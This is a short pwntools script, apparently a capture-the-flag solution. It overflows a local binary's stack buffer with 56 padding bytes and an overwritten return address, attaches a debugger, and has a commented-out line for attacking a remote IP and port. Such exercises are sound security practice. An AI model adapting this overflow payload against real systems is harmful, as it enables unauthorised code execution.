from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context(log_level='debug',arch='amd64',os='linux')
io=process("./a")
#io=remote("219.216.65.41",35888)
gdb.attach(io)
io.sendline(b'a'*56+p64(0x40123d))



io.interactive()